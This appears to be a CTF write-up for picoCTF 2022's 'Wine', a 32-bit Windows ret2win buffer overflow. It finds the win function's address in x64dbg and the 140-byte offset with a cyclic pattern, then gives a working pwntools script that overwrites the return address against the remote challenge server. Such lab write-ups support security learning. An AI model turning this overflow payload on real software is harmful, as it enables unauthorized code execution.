# Wine - Pwn - 300 points

Wine was a windows ret2win buffer overflow challenge, with the source code available to us. 

From looking at the source code, we know the buffer size and we can see that the function that we are interested in has some strings which are printed if certain conditions are met (no flag.txt in current directory):

	void win(){
	  char buf[FLAGSIZE];
	  FILE *f = fopen("flag.txt","r");
	  if (f == NULL) {
	    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if running on picoCTF servers.\n");
	    exit(0);
	  }
	  fgets(buf,FLAGSIZE,f); // size bound read
	  puts(buf);
	  fflush(stdout);
	}


So our goal is to find the address of this function and redirect the flow of the program to it.

In cases of ELF binaries finding addresses that we need is usually fairly straightforward - throw the binary in GDB, disassemble, calculate the offsets and so on - however with exe's we don't have the same luxury. There are a number of debuggers available for windows, but personally I find that none of them are quite as intuative and easy to use as GDB.

For the purposes of debugging this exe binary, I used [x64dbg](https://x64dbg.com/) inside a Windows VM, and used it to find the address of the win function. 

An interesting point to note here is the the vuln function was clearly defined in the symbols, meaning we could easily search for it specifically, but the win function's symbols weren't there - meaning we had to manually look for those previously mentioned strings. They weren't hard to find - we could use x64dbg's search feature to search for specific strings - and we can see the function address (00401530) just above the "flag.txt" string below:

![win](/home/yan/Documents/ctf/picoCTF_2022/Wine/screenshots/flag_func.png)

A quick check of the architecture using Ghidra tells us that this is a 32 bit exe binary, which means that we need to pass the address into this binary in little-endian format.

To find the offset, we need to generate a cyclic pattern, pass it into the program once it prompts us for input, and find the offset value in ESP (stack pointer) at the point of crash.

To do this I used pwntools' cyclic command line tool to generate a 200 character pattern and passed it into the program. Inpecting the registers in x64dbg shows us the values from our pattern  that made it into the ESP:

![esp](/home/yan/Documents/ctf/picoCTF_2022/Wine/screenshots/offset.png)


So our final payload is 144 bytes - 4 bytes for the address we want to redirect to and 140 junk characters. Finally, we can put together a quick pwntools scripts and get the flag:

	from pwn import *

	# Pass in remote server details
	def start(argv=[], *a, **kw):
	    return remote(sys.argv[1], sys.argv[2], *a, **kw)

	# context.log_level = 'debug'

	# Start program
	io = start()

	io.recvline() # Give me a string!

	offset = 140
	address = b"\x30\x15\x40\x00"

	# Build payload (ret2win)
	payload = flat([
	    offset * b'A',  
	    address
	])

	# Send the payload
	io.sendline(payload)

	# Get our flag
	flag = io.recvline()

	p = log.progress('Flag: ')
	p.success(flag.decode('utf-8'))

